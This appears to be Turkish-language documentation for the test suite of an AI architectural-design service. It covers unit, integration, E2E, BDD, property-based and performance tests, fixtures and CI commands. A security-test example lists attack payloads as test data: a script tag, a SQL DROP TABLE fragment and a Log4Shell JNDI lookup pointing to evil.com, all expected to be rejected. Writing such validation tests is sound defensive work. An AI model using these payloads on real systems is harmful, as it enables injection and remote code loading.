# Documentation: Testing & Validation Implementasyonu
# ArchBuilder.AI için kapsamlı test altyapısı dokümantasyonu

## Genel Bakış

ArchBuilder.AI projesi için kapsamlı test ve doğrulama altyapısı oluşturulmuştur. Bu sistem QA instruction guidelines'ına uygun olarak test piramidi yaklaşımını benimser:

- **%70 Unit Tests**: Birim testler
- **%20 Integration Tests**: Entegrasyon testleri  
- **%10 E2E Tests**: Uçtan uca testler
- **BDD Scenarios**: Davranış odaklı geliştirme senaryoları
- **Performance Tests**: Performans ve benchmark testleri

## Kurulum ve Bağımlılıklar

### Test Bağımlılıklarının Kurulması

```bash
cd src/cloud-server
pip install -r requirements.txt

# Test-specific dependencies
pip install hypothesis==6.112.1
pip install pytest-benchmark==4.0.0
pip install pytest-xdist==3.6.0
pip install playwright==1.48.0
pip install pytest-playwright==0.6.2
pip install pytest-bdd==7.3.0
```

### Playwright Kurulumu (E2E Testler için)

```bash
playwright install chromium
```

## Test Dosyaları ve Yapısı

### 1. Test Infrastructure (`test_infrastructure.py`)

**Amaç**: Tüm testler için ortak altyapı ve yardımcı sınıflar

**Temel Bileşenler**:
- `TestConfig`: Test konfigürasyon ayarları
- `TestDataBuilder`: Test verisi oluşturma pattern'ı
- `MockAIService`: AI servisleri için mock implementasyonu
- `AIOutputValidator`: AI çıktılarının güvenlik ve kalite doğrulaması
- `PerformanceTestRunner`: Performans test yardımcıları

**Kullanım**:
```python
from tests.test_infrastructure import TestDataBuilder, MockAIService

# Test verisi oluşturma
user_data = TestDataBuilder.valid_user_data()
ai_request = TestDataBuilder.valid_ai_command_request()

# Mock AI servisi kullanma
ai_service = MockAIService(failure_rate=0.1)
result = await ai_service.process_command(ai_request, "test_correlation_123")
```

### 2. Unit Tests (`test_ai_service_unit.py`)

**Amaç**: AI servisi ve temel bileşenlerin birim testleri (%70 hedef kapsama)

**Test Kategorileri**:
- AI servisi başlatma ve konfigürasyon
- Model seçimi ve fallback mekanizmaları
- AI çıktı doğrulaması ve güvenlik kontrolü
- Hata yönetimi ve timeout işlemleri
- Property-based testing (Hypothesis kullanımı)

**Örnek Kullanım**:
```bash
python -m pytest tests/test_ai_service_unit.py -v --cov=app
```

### 3. Integration Tests (`test_integration.py`)

**Amaç**: Sistem bileşenleri arası entegrasyon testleri (%20 hedef kapsama)

**Test Alanları**:
- API endpoint'leri ve HTTP yanıtları
- Veritabanı işlemleri ve session yönetimi
- Authentication ve authorization
- Subscription ve usage tracking entegrasyonu
- Performans gereksinimlerinin karşılanması

**Örnek Kullanım**:
```bash
python -m pytest tests/test_integration.py -v --cov=app
```

### 4. End-to-End Tests (`test_e2e.py`)

**Amaç**: Tam kullanıcı iş akışları testi (%10 hedef kapsama)

**Test Senaryoları**:
- Tam mimari tasarım iş akışı (proje oluşturma → AI üretimi → Revit export)
- AI-insan işbirliği ve iteratif tasarım süreçleri
- Çoklu format döküman işleme (DWG, PDF, IFC)
- Hata kurtarma ve sistem dayanıklılığı

**Playwright Kullanımı**:
```python
async def test_complete_workflow(self, page: Page):
    await page.goto("http://localhost:8080")
    await self._login_user(page, "architect@test.com", "password")
    layout = await self._generate_ai_layout(page, {"prompt": "3 bedroom house"})
    await self._export_to_revit(page, layout)
```

### 5. BDD Scenarios (`test_bdd_scenarios.py`)

**Amaç**: Davranış odaklı geliştirme senaryoları

**Scenario Türleri**:
- AI-Human Collaboration workflows
- Complete Project workflows
- Multi-format Document processing

**Gherkin-style Scenarios**:
```python
@given('I am an authenticated architect')
@when('I request AI to generate a layout with prompt "3 bedroom house"')
@then('the AI should generate a layout that includes walls, doors, and rooms')
```

### 6. Performance Tests (`test_performance.py`)

**Amaç**: Performans ve benchmark testleri

**Performance Hedefleri**:
- API yanıt süresi: <500ms
- AI işleme süresi: <30 saniye
- Hata oranı: <%0.1

**Benchmark Kullanımı**:
```python
@pytest.mark.benchmark
def test_ai_processing_benchmark(self, benchmark):
    result = benchmark(ai_processing_function)
    assert result["processing_time"] < 30000  # 30 seconds
```

## Test Çalıştırma

### Hızlı Test Çalıştırma (Geliştirme)

```bash
# Hızlı testler (unit + integration)
python run_tests.py fast

# Sadece unit testler
python run_tests.py unit

# Sadece integration testler
python run_tests.py integration
```

### Tam Test Suite

```bash
# Tüm testleri çalıştır
python run_tests.py all

# Performans testleri dahil
python run_tests.py performance
```

### Kapsama Raporu ile

```bash
python -m pytest tests/ --cov=app --cov-report=html:htmlcov --cov-report=term-missing
```

## Test Konfigürasyonu (`conftest.py`)

### Pytest Markers

- `@pytest.mark.unit`: Birim testler
- `@pytest.mark.integration`: Entegrasyon testleri
- `@pytest.mark.e2e`: E2E testler
- `@pytest.mark.performance`: Performans testleri
- `@pytest.mark.security`: Güvenlik testleri
- `@pytest.mark.slow`: Yavaş testler (>10 saniye)
- `@pytest.mark.ai_dependent`: AI servisleri gerektiren testler

### Fixtures

```python
@pytest.fixture
async def test_db_session():
    """Test veritabanı session'ı"""
    
@pytest.fixture
async def test_client():
    """Test HTTP client'ı"""
    
@pytest.fixture
def authenticated_user_token():
    """Doğrulanmış kullanıcı token'ı"""
```

## Property-Based Testing (Hypothesis)

Hypothesis kütüphanesi ile rastgele veri üretimi ve edge case testleri:

```python
from hypothesis import given, strategies as st

@given(st.text(min_size=1, max_size=1000))
async def test_prompt_injection_prevention(self, malicious_input):
    # Herhangi bir text input için güvenlik testi
    sanitized = await AIService._sanitize_prompt(malicious_input)
    assert isinstance(sanitized, str)
```

## Güvenlik ve Doğrulama

### AI Çıktı Doğrulaması

```python
validation_result = await AIOutputValidator.validate_ai_output(ai_output, correlation_id)

# Zorunlu kontroller:
assert validation_result["requires_human_review"] is True  # Her zaman insan onayı
assert validation_result["is_valid"] is True  # Güvenlik kontrolü
assert validation_result["confidence"] >= threshold  # Güven eşiği
```

### Güvenlik Testleri

- Input validation ve injection saldırıları
- Authentication token doğrulaması  
- CORS ve security headers
- Malicious content detection

## Performans İzleme

### API Performans Hedefleri

```python
# API endpoint'leri
assert response_time_ms < 500  # 500ms altında

# AI işleme
assert processing_time_ms < 30000  # 30 saniye altında

# Hata oranı
assert error_rate < 0.001  # %0.1 altında
```

### Benchmark Raporları

```bash
# Benchmark raporları
reports/benchmark_results.json
reports/performance_benchmark.json
```

## CI/CD Entegrasyonu

### Hızlı CI Pipeline

```bash
# Sadece kritik testler (1-2 dakika)
python run_tests.py fast --timeout=60
```

### Tam Test Pipeline

```bash
# Tam test suite (10-30 dakika)
python run_tests.py all
```

### Test Raporları

- HTML Coverage: `htmlcov/index.html`
- JUnit XML: `reports/*.xml`
- Benchmark JSON: `reports/benchmark_results.json`

## Hata Yönetimi

### Test Başarısızlık Analizi

```python
# Correlation ID ile test tracking
logger.error("Test failed", correlation_id=correlation_id, test_name=test_name)

# Performance threshold violations
assert response_time < threshold, f"Response time {response_time}ms exceeds {threshold}ms"
```

### Debug ve Troubleshooting

```bash
# Verbose output ile debug
python -m pytest tests/ -v -s --tb=long

# Sadece başarısız testleri tekrar çalıştır
python -m pytest tests/ --lf

# PDB debugger ile durdur
python -m pytest tests/ --pdb
```

## Best Practices

### 1. Test Verisi Yönetimi

- `TestDataBuilder` pattern kullanın
- Realistic test data oluşturun
- Mock'ları gerçekçi davranış için konfigüre edin

### 2. Async Test Yazımı

```python
@pytest.mark.asyncio
async def test_async_operation():
    result = await async_function()
    assert result is not None
```

### 3. Performance Test Yaklaşımı

- Realistic timing expectations
- Concurrent request testing
- Memory usage monitoring
- Throughput measurement

### 4. Security Test Patterns

```python
# Input validation testing
malicious_inputs = ["<script>", "'; DROP TABLE", "${jndi:ldap://evil.com}"]
for malicious_input in malicious_inputs:
    with pytest.raises(ValidationException):
        await validate_input(malicious_input)
```

## Konfigürasyon

### Test Environment Variables

```bash
ENVIRONMENT=testing
LOG_LEVEL=DEBUG
AI_MODEL_TIMEOUT=30
DATABASE_URL=sqlite+aiosqlite:///./test_archbuilder.db
```

### Test Settings

```python
class TestConfig:
    API_RESPONSE_THRESHOLD_MS = 500
    AI_PROCESSING_THRESHOLD_MS = 30000
    ERROR_RATE_THRESHOLD = 0.001
    AI_CONFIDENCE_THRESHOLD = 0.8
```

## Sonuç

Bu test altyapısı ArchBuilder.AI için:

✅ **Kapsamlı Kalite Güvencesi**: Test piramidi ile %80+ kod kapsaması
✅ **Performans Doğrulaması**: API ve AI işleme hız gereksinimleri
✅ **Güvenlik Validasyonu**: AI çıktı güvenlik kontrolü ve input validation
✅ **BDD Scenarios**: İş akışı doğrulaması ve user story testing
✅ **CI/CD Ready**: Hızlı ve tam test pipeline'ları
✅ **Property-Based Testing**: Edge case ve robustness testing
✅ **Comprehensive Reporting**: HTML, XML, JSON formatlarında raporlama

Bu altyapı ile ArchBuilder.AI production-ready kalite standartlarına ulaşır ve sürekli integration/deployment süreçlerini destekler.